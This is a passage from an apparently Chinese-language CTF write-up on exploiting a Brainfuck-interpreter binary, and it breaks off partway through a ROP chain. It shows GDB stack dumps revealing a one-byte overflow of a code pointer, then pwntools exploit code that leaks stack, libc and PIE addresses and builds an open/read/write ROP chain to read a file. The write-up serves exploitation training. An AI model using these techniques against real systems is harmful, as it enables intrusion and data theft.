    ......
    0x7ffcc837f870:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f880:    0x00007ffcc837f890    0x0000000000000007
    0x7ffcc837f890:    0x002c5d2b2e3e5b2b    0x0000000000000000
    0x7ffcc837f8a0:    0x00005566d35f4980    0xca398a01bea61c00
    0x7ffcc837f8b0:    0x00007ffcc837f9a0    0x0000000000000000
    0x7ffcc837f8c0:    0x00005566d35f4980    0x00007f1cc088cb97
    0x7ffcc837f8d0:    0xffffffffffffff90    0x00007ffcc837f9a8
    0x7ffcc837f8e0:    0x00000001ffffff90    0x00005566d35f1684
    0x7ffcc837f8f0:    0x0000000000000000    0xacc40576de043fed
    0x7ffcc837f900:    0x00005566d35f1420    0x00007ffcc837f9a0
    0x7ffcc837f910:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f920:    0xf9f033a7bca43fed    0xf83022d9db9a3fed
    0x7ffcc837f930:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f940:    0x0000000000000000    0x00007f1cc120d733
    0x7ffcc837f950:    0x00007f1cc11ed2b8    0x0000000000198d4c
    0x7ffcc837f960:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f970:    0x0000000000000000    0x00005566d35f1420
    0x7ffcc837f980:    0x00007ffcc837f9a0    0x00005566d35f144a
    0x7ffcc837f990:    0x00007ffcc837f998    0x000000000000001c
    0x7ffcc837f9a0:    0x0000000000000001    0x00007ffcc8381335
    0x7ffcc837f9b0:    0x0000000000000000    0x00007ffcc838133a
    0x7ffcc837f9c0:    0x00007ffcc8381390    0x00007ffcc83813e8
    0x7ffcc837f9d0:    0x00007ffcc83813fa    0x00007ffcc838141b
    0x7ffcc837f9e0:    0x00007ffcc8381430    0x00007ffcc8381441
    0x7ffcc837f9f0:    0x00007ffcc8381452    0x00007ffcc8381460
    0x7ffcc837fa00:    0x00007ffcc83814e2    0x00007ffcc83814ed
    0x7ffcc837fa10:    0x00007ffcc8381501    0x00007ffcc838150c
    0x7ffcc837fa20:    0x00007ffcc838151f    0x00007ffcc8381530
    0x7ffcc837fa30:    0x00007ffcc8381540    0x00007ffcc8381550
    0x7ffcc837fa40:    0x00007ffcc8381579    0x00007ffcc8381590
    0x7ffcc837fa50:    0x00007ffcc83815e2    0x00007ffcc8381637
    0x7ffcc837fa60:    0x00007ffcc8381659    0x00007ffcc838166f
    0x7ffcc837fa70:    0x00007ffcc8381684    0x00007ffcc83816b0
    0x7ffcc837fa80:    0x00007ffcc83816c3    0x00007ffcc83816d0
    0x7ffcc837fa90:    0x00007ffcc83816e4    0x00007ffcc8381718
    0x7ffcc837faa0:    0x00007ffcc8381747    0x00007ffcc8381759
    0x7ffcc837fab0:    0x00007ffcc8381774    0x00007ffcc8381793
    0x7ffcc837fac0:    0x00007ffcc83817bc    0x00007ffcc83817d0
    0x7ffcc837fad0:    0x00007ffcc83817e1    0x00007ffcc83817f3
    0x7ffcc837fae0:    0x00007ffcc8381805    0x00007ffcc8381826
    0x7ffcc837faf0:    0x00007ffcc8381846    0x00007ffcc8381864
    0x7ffcc837fb00:    0x00007ffcc8381884    0x00007ffcc8381895
    0x7ffcc837fb10:    0x00007ffcc83818f1    0x00007ffcc8381903
    0x7ffcc837fb20:    0x00007ffcc838191f    0x00007ffcc8381932
    0x7ffcc837fb30:    0x00007ffcc8381949    0x00007ffcc8381976
    0x7ffcc837fb40:    0x00007ffcc8381993    0x00007ffcc838199b
    0x7ffcc837fb50:    0x00007ffcc83819cd    0x00007ffcc83819e1
    0x7ffcc837fb60:    0x00007ffcc83819f8    0x00007ffcc8381fe4
这是执行后的栈情况：
    gef➤  x/400gx $rsp
    0x7ffcc837f3e0:    0x00007f1cc11f99e0    0x010a7f1cc0e9aef0
    0x7ffcc837f3f0:    0x0000000700000007    0x00007ffcc837f880
    0x7ffcc837f400:    0x00007f1cc11fa901    0x0000000000000000
    0x7ffcc837f410:    0x00005566d3bb40d0    0x00005566d3bb4100
    0x7ffcc837f420:    0x00005566d3bb40d0    0x0000000000000002
    0x7ffcc837f430:    0x00005566d3bb3e70    0x0000000000000008
    0x7ffcc837f440:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
    0x7ffcc837f450:    0x00005566d3bb40c0    0x00005566d3bb3e88
    0x7ffcc837f460:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
    0x7ffcc837f470:    0x00005566d3bb40c0    0x00005566d3bb3e88
    0x7ffcc837f480:    0x0101010101010101    0x0101010101010101
    ......
    0x7ffcc837f870:    0x0101010101010101    0x0101010101010101
    0x7ffcc837f880:    0x00007ffcc837f841    0x0000000000000007
    0x7ffcc837f890:    0x002c5d2b2e3e5b2b    0x0000000000000000
    0x7ffcc837f8a0:    0x00005566d35f4980    0xca398a01bea61c00
    0x7ffcc837f8b0:    0x00007ffcc837f9a0    0x0000000000000000
    0x7ffcc837f8c0:    0x00005566d35f4980    0x00007f1cc088cb97
    0x7ffcc837f8d0:    0xffffffffffffff90    0x00007ffcc837f9a8
    0x7ffcc837f8e0:    0x00000001ffffff90    0x00005566d35f1684
    0x7ffcc837f8f0:    0x0000000000000000    0xacc40576de043fed
    0x7ffcc837f900:    0x00005566d35f1420    0x00007ffcc837f9a0
    0x7ffcc837f910:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f920:    0xf9f033a7bca43fed    0xf83022d9db9a3fed
    0x7ffcc837f930:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f940:    0x0000000000000000    0x00007f1cc120d733
    0x7ffcc837f950:    0x00007f1cc11ed2b8    0x0000000000198d4c
    0x7ffcc837f960:    0x0000000000000000    0x0000000000000000
    0x7ffcc837f970:    0x0000000000000000    0x00005566d35f1420
    0x7ffcc837f980:    0x00007ffcc837f9a0    0x00005566d35f144a
    0x7ffcc837f990:    0x00007ffcc837f998    0x000000000000001c
    0x7ffcc837f9a0:    0x0000000000000001    0x00007ffcc8381335
    0x7ffcc837f9b0:    0x0000000000000000    0x00007ffcc838133a
    0x7ffcc837f9c0:    0x00007ffcc8381390    0x00007ffcc83813e8
    0x7ffcc837f9d0:    0x00007ffcc83813fa    0x00007ffcc838141b
    0x7ffcc837f9e0:    0x00007ffcc8381430    0x00007ffcc8381441
    0x7ffcc837f9f0:    0x00007ffcc8381452    0x00007ffcc8381460
    0x7ffcc837fa00:    0x00007ffcc83814e2    0x00007ffcc83814ed
    0x7ffcc837fa10:    0x00007ffcc8381501    0x00007ffcc838150c
    0x7ffcc837fa20:    0x00007ffcc838151f    0x00007ffcc8381530
    0x7ffcc837fa30:    0x00007ffcc8381540    0x00007ffcc8381550
    0x7ffcc837fa40:    0x00007ffcc8381579    0x00007ffcc8381590
    0x7ffcc837fa50:    0x00007ffcc83815e2    0x00007ffcc8381637
    0x7ffcc837fa60:    0x00007ffcc8381659    0x00007ffcc838166f
    0x7ffcc837fa70:    0x00007ffcc8381684    0x00007ffcc83816b0
    0x7ffcc837fa80:    0x00007ffcc83816c3    0x00007ffcc83816d0
    0x7ffcc837fa90:    0x00007ffcc83816e4    0x00007ffcc8381718
    0x7ffcc837faa0:    0x00007ffcc8381747    0x00007ffcc8381759
    0x7ffcc837fab0:    0x00007ffcc8381774    0x00007ffcc8381793
    0x7ffcc837fac0:    0x00007ffcc83817bc    0x00007ffcc83817d0
    0x7ffcc837fad0:    0x00007ffcc83817e1    0x00007ffcc83817f3
    0x7ffcc837fae0:    0x00007ffcc8381805    0x00007ffcc8381826
    0x7ffcc837faf0:    0x00007ffcc8381846    0x00007ffcc8381864
    0x7ffcc837fb00:    0x00007ffcc8381884    0x00007ffcc8381895
    0x7ffcc837fb10:    0x00007ffcc83818f1    0x00007ffcc8381903
    0x7ffcc837fb20:    0x00007ffcc838191f    0x00007ffcc8381932
    0x7ffcc837fb30:    0x00007ffcc8381949    0x00007ffcc8381976
    0x7ffcc837fb40:    0x00007ffcc8381993    0x00007ffcc838199b
    0x7ffcc837fb50:    0x00007ffcc83819cd    0x00007ffcc83819e1
    0x7ffcc837fb60:    0x00007ffcc83819f8    0x00007ffcc8381fe4
请注意`0x7ffcc837f880`处的代码，可以发现，我们可以越界写一个字符，而这个位置恰好储存了我们的代码区域的地址，那么我们事实上可以将其修改到返回地址处，这样我们就可以程序做任意地址跳转，并且发现程序会打印我们输入的代码内容，那么我们就可以利用无截断来泄露信息。
###  漏洞利用
  1. 首先我们需要先泄露原本的`bf_code`的地址末位。 
        sh.recvuntil('enter your code:')
    sh.sendline('+[>.+],')
    sh.recvuntil('x00' * 0x3FF)
    code_low_addr = u64(sh.recv(1).ljust(8,'x00'))
    success("code low bit --> " + str(hex(code_low_addr)))
  2. 接下来我们进行低位覆盖，将`bf_code`移动到`bf_code + 0x20`的位置上，在那之后我们就能获取到`ESP`的值。 
        payload = code_low_addr + 0x20
    payload = p8((payload) & 0xFF)
    sh.send(payload)
    sh.recvuntil("done! your code: ")
    esp_addr = u64(sh.recv(6).ljust(8,'x00')) - 0x5C0
    info('ESP addr-->'+str(hex(esp_addr)))
  3. 接下来我们选择不跳出循环。 
        sh.recvuntil('want to continue?')
    sh.send('y')
  4. 重复刚才的步骤，低位覆盖，将`bf_code`移动到`bf_code + 0x38`的位置上，在那之后我们能获取到`LIBC`的基址。 
        sh.recvuntil('enter your code:')
    sh.sendline('+[>.+],')
    sh.send(p8((code_low_addr + 0x38) & 0xFF))
    sh.recvuntil("done! your code: ")
    libc.address = u64(sh.recv(6).ljust(8,'x00')) + 0x00007fd6723b7000 - 0x7fd6723d8b97
    info('LIBC ADDRESS --> ' + str(hex(libc.address)))
  5. 接下来我们选择不跳出循环。 
        sh.recvuntil('want to continue?')
    sh.send('y')
  6. 重复刚才的步骤，低位覆盖，将`bf_code`移动到`bf_code + 0x30`的位置上，在那之后我们获取到程序加载基址。 **同时这又是`RBP`的位置。**
        sh.recvuntil('enter your code:')
    sh.sendline('+[>.+],')
    sh.send(p8((code_low_addr + 0x30) & 0xFF))
    sh.recvuntil("done! your code: ")
    PIE_address = u64(sh.recv(6).ljust(8,'x00')) - 0x4980
    info('PIE ADDRESS --> ' + str(hex(PIE_address)))
  7. 接下来我们可以构造`ROP`链，首先列出我们需要利用的`gadgets`。 
        0x000000000002155f: pop rdi; ret;
    0x0000000000023e6a: pop rsi; ret;
    0x0000000000001b96: pop rdx; ret;
    0x00000000000439c8: pop rax; ret;
    0x00000000000d2975: syscall; ret;
那么我们可以构造如下`ROP chain`：
        # read(0,BSS+0x400,0x20)
    ROP_chain  = p64(libc.address + 0x000000000002155f)
    ROP_chain += p64(0)
    ROP_chain += p64(libc.address + 0x0000000000023e6a)
    ROP_chain += p64(PIE_address + bf.bss() + 0x400)
    ROP_chain += p64(libc.address + 0x0000000000001b96)
    ROP_chain += p64(0x20)
    ROP_chain += p64(libc.address + 0x00000000000439c8)
    ROP_chain += p64(0)
    ROP_chain += p64(libc.address + 0x00000000000d2975)
    # open(BSS+0x400,0)
    ROP_chain += p64(libc.address + 0x000000000002155f)
    ROP_chain += p64(PIE_address + bf.bss() + 0x400)
    ROP_chain += p64(libc.address + 0x0000000000023e6a)
    ROP_chain += p64(0)
    ROP_chain += p64(libc.address + 0x00000000000439c8)
    ROP_chain += p64(2)
    ROP_chain += p64(libc.address + 0x00000000000d2975)
    # read(3,BSS+0x500,0x20)
    ROP_chain += p64(libc.address + 0x000000000002155f)
    ROP_chain += p64(3)
    ROP_chain += p64(libc.address + 0x0000000000023e6a)
    ROP_chain += p64(PIE_address + bf.bss() + 0x500)
    ROP_chain += p64(libc.address + 0x0000000000001b96)
    ROP_chain += p64(0x20)
    ROP_chain += p64(libc.address + 0x00000000000439c8)
    ROP_chain += p64(0)
    ROP_chain += p64(libc.address + 0x00000000000d2975)
    # write(0,BSS+0x500,0x20)
    ROP_chain += p64(libc.address + 0x000000000002155f)
    ROP_chain += p64(1)
    ROP_chain += p64(libc.address + 0x0000000000023e6a)
    ROP_chain += p64(PIE_address + bf.bss() + 0x500)
    ROP_chain += p64(libc.address + 0x0000000000001b96)
    ROP_chain += p64(0x20)
    ROP_chain += p64(libc.address + 0x00000000000439c8)